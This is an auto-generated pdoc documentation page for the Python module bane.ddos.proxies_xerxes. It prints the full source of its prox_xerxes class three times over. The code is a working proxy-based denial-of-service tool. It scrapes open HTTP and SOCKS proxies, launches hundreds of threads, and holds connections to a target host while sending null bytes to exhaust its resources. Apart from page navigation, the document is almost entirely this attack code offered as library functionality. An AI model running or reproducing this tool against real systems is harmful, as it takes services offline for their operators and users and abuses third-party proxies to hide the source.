<body>
<main>
<article id="content">
<header>
<h1 class="title">Module <code>bane.ddos.proxies_xerxes</code></h1>
</header>
<section id="section-intro">
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">from bane.ddos.utils import *

class prox_xerxes(DDoS_Class):
    def __init__(
        self,
        u,
        scraping_timeout=15,
        p=80,
        threads_daemon=True,
        threads=700,
        timeout=5,
        http_list=None,
        socks4_list=None,
        socks5_list=None,
        duration=60,
        logs=False,
    ):
        self.httplist = http_list
        if not self.httplist and self.httplist != []:
            self.httplist = proxyscrape(timeout=scraping_timeout)
        self.socks4list = socks4_list
        if not self.socks4list and self.socks4list != []:
            self.socks4list = proxyscrape(protocol=&#39;socks4&#39;,timeout=scraping_timeout)
        self.socks5list = socks5_list
        if not self.socks5list and self.socks5list != []:
            self.socks5list = proxyscrape(protocol=&#39;socks5&#39;,timeout=scraping_timeout)
        self.stop = False
        self.counter = 0
        self.start = time.time()
        self.target = u
        self.duration = duration
        self.port = p
        self.timeout = timeout
        self.logs = logs
        self.id_key = 0
        for x in range(threads):
            try:
                t = threading.Thread(target=self.attack)
                t.daemon = threads_daemon
                t.start()
                self.id_key += 1
            except:
                pass

    def attack(self):
        try:
            x = self.id_key
            time.sleep(1)
            while True:
                if (
                    int(time.time() - self.start) &gt;= self.duration
                ):  # this is a safety mechanism so the attack won&#39;t run forever
                    break
                if self.stop == True:
                    break
                try:
                    bot_type = []
                    if len(self.httplist) &gt; 0:
                        bot_type.append(&#34;h&#34;)
                    if len(self.socks4list) &gt; 0:
                        bot_type.append(&#34;s4&#34;)
                    if len(self.socks5list) &gt; 0:
                        bot_type.append(&#34;s5&#34;)
                    z = random.choice(bot_type)
                    if z == &#34;h&#34;:
                        line = random.choice(self.httplist)
                    elif z == &#34;s4&#34;:
                        line = random.choice(self.socks4list)
                    elif z == &#34;s5&#34;:
                        line = random.choice(self.socks5list)
                    ipp = line.split(&#34;:&#34;)[0].split(&#34;=&#34;)[0]
                    pp = line.split(&#34;:&#34;)[1].split(&#34;=&#34;)[0]
                    s = socks.socksocket()
                    if z == &#34;h&#34;:
                        s.setproxy(socks.PROXY_TYPE_HTTP, str(ipp), int(pp), True)
                    elif z == &#34;s4&#34;:
                        s.setproxy(socks.PROXY_TYPE_SOCKS4, str(ipp), int(pp), True)
                    elif z == &#34;s5&#34;:
                        s.setproxy(socks.PROXY_TYPE_SOCKS5, str(ipp), int(pp), True)
                    if z == &#34;h&#34;:
                        s.settimeout(self.timeout)
                    s.connect((self.target, self.port))
                    self.counter += 1
                    while True:
                        if (
                            int(time.time() - self.start) &gt;= self.duration
                        ):  # this is a safety mechanism so the attack won&#39;t run forever
                            break
                        if self.stop == True:
                            break
                        try:
                            s.send(&#34;\x00&#34;.encode(&#34;utf-8&#34;))  # send NULL character
                            if self.logs == True:
                                sys.stdout.write(
                                    &#34;\r[{}: Voly sent--&gt;{}]     &#34;.format(x, ipp)
                                )
                                sys.stdout.flush()
                        except:
                            break
                        time.sleep(0.2)
                except:
                    pass
                self.counter -= 1
                time.sleep(0.3)
            self.kill()
        except:
            pass</code></pre>
</details>
</section>
<section>
</section>
<section>
</section>
<section>
</section>
<section>
<h2 class="section-title" id="header-classes">Classes</h2>
<dl>
<dt id="bane.ddos.proxies_xerxes.prox_xerxes"><code class="flex name class">
<span>class <span class="ident">prox_xerxes</span></span>
<span>(</span><span>u, scraping_timeout=15, p=80, threads_daemon=True, threads=700, timeout=5, http_list=None, socks4_list=None, socks5_list=None, duration=60, logs=False)</span>
</code></dt>
<dd>
<div class="desc"></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">class prox_xerxes(DDoS_Class):
    def __init__(
        self,
        u,
        scraping_timeout=15,
        p=80,
        threads_daemon=True,
        threads=700,
        timeout=5,
        http_list=None,
        socks4_list=None,
        socks5_list=None,
        duration=60,
        logs=False,
    ):
        self.httplist = http_list
        if not self.httplist and self.httplist != []:
            self.httplist = proxyscrape(timeout=scraping_timeout)
        self.socks4list = socks4_list
        if not self.socks4list and self.socks4list != []:
            self.socks4list = proxyscrape(protocol=&#39;socks4&#39;,timeout=scraping_timeout)
        self.socks5list = socks5_list
        if not self.socks5list and self.socks5list != []:
            self.socks5list = proxyscrape(protocol=&#39;socks5&#39;,timeout=scraping_timeout)
        self.stop = False
        self.counter = 0
        self.start = time.time()
        self.target = u
        self.duration = duration
        self.port = p
        self.timeout = timeout
        self.logs = logs
        self.id_key = 0
        for x in range(threads):
            try:
                t = threading.Thread(target=self.attack)
                t.daemon = threads_daemon
                t.start()
                self.id_key += 1
            except:
                pass

    def attack(self):
        try:
            x = self.id_key
            time.sleep(1)
            while True:
                if (
                    int(time.time() - self.start) &gt;= self.duration
                ):  # this is a safety mechanism so the attack won&#39;t run forever
                    break
                if self.stop == True:
                    break
                try:
                    bot_type = []
                    if len(self.httplist) &gt; 0:
                        bot_type.append(&#34;h&#34;)
                    if len(self.socks4list) &gt; 0:
                        bot_type.append(&#34;s4&#34;)
                    if len(self.socks5list) &gt; 0:
                        bot_type.append(&#34;s5&#34;)
                    z = random.choice(bot_type)
                    if z == &#34;h&#34;:
                        line = random.choice(self.httplist)
                    elif z == &#34;s4&#34;:
                        line = random.choice(self.socks4list)
                    elif z == &#34;s5&#34;:
                        line = random.choice(self.socks5list)
                    ipp = line.split(&#34;:&#34;)[0].split(&#34;=&#34;)[0]
                    pp = line.split(&#34;:&#34;)[1].split(&#34;=&#34;)[0]
                    s = socks.socksocket()
                    if z == &#34;h&#34;:
                        s.setproxy(socks.PROXY_TYPE_HTTP, str(ipp), int(pp), True)
                    elif z == &#34;s4&#34;:
                        s.setproxy(socks.PROXY_TYPE_SOCKS4, str(ipp), int(pp), True)
                    elif z == &#34;s5&#34;:
                        s.setproxy(socks.PROXY_TYPE_SOCKS5, str(ipp), int(pp), True)
                    if z == &#34;h&#34;:
                        s.settimeout(self.timeout)
                    s.connect((self.target, self.port))
                    self.counter += 1
                    while True:
                        if (
                            int(time.time() - self.start) &gt;= self.duration
                        ):  # this is a safety mechanism so the attack won&#39;t run forever
                            break
                        if self.stop == True:
                            break
                        try:
                            s.send(&#34;\x00&#34;.encode(&#34;utf-8&#34;))  # send NULL character
                            if self.logs == True:
                                sys.stdout.write(
                                    &#34;\r[{}: Voly sent--&gt;{}]     &#34;.format(x, ipp)
                                )
                                sys.stdout.flush()
                        except:
                            break
                        time.sleep(0.2)
                except:
                    pass
                self.counter -= 1
                time.sleep(0.3)
            self.kill()
        except:
            pass</code></pre>
</details>
<h3>Ancestors</h3>
<ul class="hlist">
<li><a title="bane.ddos.utils.DDoS_Class" href="utils.html#bane.ddos.utils.DDoS_Class">DDoS_Class</a></li>
</ul>
<h3>Methods</h3>
<dl>
<dt id="bane.ddos.proxies_xerxes.prox_xerxes.attack"><code class="name flex">
<span>def <span class="ident">attack</span></span>(<span>self)</span>
</code></dt>
<dd>
<div class="desc"></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def attack(self):
    try:
        x = self.id_key
        time.sleep(1)
        while True:
            if (
                int(time.time() - self.start) &gt;= self.duration
            ):  # this is a safety mechanism so the attack won&#39;t run forever
                break
            if self.stop == True:
                break
            try:
                bot_type = []
                if len(self.httplist) &gt; 0:
                    bot_type.append(&#34;h&#34;)
                if len(self.socks4list) &gt; 0:
                    bot_type.append(&#34;s4&#34;)
                if len(self.socks5list) &gt; 0:
                    bot_type.append(&#34;s5&#34;)
                z = random.choice(bot_type)
                if z == &#34;h&#34;:
                    line = random.choice(self.httplist)
                elif z == &#34;s4&#34;:
                    line = random.choice(self.socks4list)
                elif z == &#34;s5&#34;:
                    line = random.choice(self.socks5list)
                ipp = line.split(&#34;:&#34;)[0].split(&#34;=&#34;)[0]
                pp = line.split(&#34;:&#34;)[1].split(&#34;=&#34;)[0]
                s = socks.socksocket()
                if z == &#34;h&#34;:
                    s.setproxy(socks.PROXY_TYPE_HTTP, str(ipp), int(pp), True)
                elif z == &#34;s4&#34;:
                    s.setproxy(socks.PROXY_TYPE_SOCKS4, str(ipp), int(pp), True)
                elif z == &#34;s5&#34;:
                    s.setproxy(socks.PROXY_TYPE_SOCKS5, str(ipp), int(pp), True)
                if z == &#34;h&#34;:
                    s.settimeout(self.timeout)
                s.connect((self.target, self.port))
                self.counter += 1
                while True:
                    if (
                        int(time.time() - self.start) &gt;= self.duration
                    ):  # this is a safety mechanism so the attack won&#39;t run forever
                        break
                    if self.stop == True:
                        break
                    try:
                        s.send(&#34;\x00&#34;.encode(&#34;utf-8&#34;))  # send NULL character
                        if self.logs == True:
                            sys.stdout.write(
                                &#34;\r[{}: Voly sent--&gt;{}]     &#34;.format(x, ipp)
                            )
                            sys.stdout.flush()
                    except:
                        break
                    time.sleep(0.2)
            except:
                pass
            self.counter -= 1
            time.sleep(0.3)
        self.kill()
    except:
        pass</code></pre>
</details>
</dd>
</dl>
</dd>
</dl>
</section>
</article>
<nav id="sidebar">
<h1>Index</h1>
<div class="toc">
<ul></ul>
</div>
<ul id="index">
<li><h3>Super-module</h3>
<ul>
<li><code><a title="bane.ddos" href="index.md">bane.ddos</a></code></li>
</ul>
</li>
<li><h3><a href="#header-classes">Classes</a></h3>
<ul>
<li>
<h4><code><a title="bane.ddos.proxies_xerxes.prox_xerxes" href="#bane.ddos.proxies_xerxes.prox_xerxes">prox_xerxes</a></code></h4>
<ul class="">
<li><code><a title="bane.ddos.proxies_xerxes.prox_xerxes.attack" href="#bane.ddos.proxies_xerxes.prox_xerxes.attack">attack</a></code></li>
</ul>
</li>
</ul>
</li>
</ul>
</nav>
</main>
<footer id="footer">
<p>Generated by <a href="https://pdoc3.github.io/pdoc" title="pdoc: Python API documentation generator"><cite>pdoc</cite> 0.10.0</a>.</p>
</footer>
</body>
</html>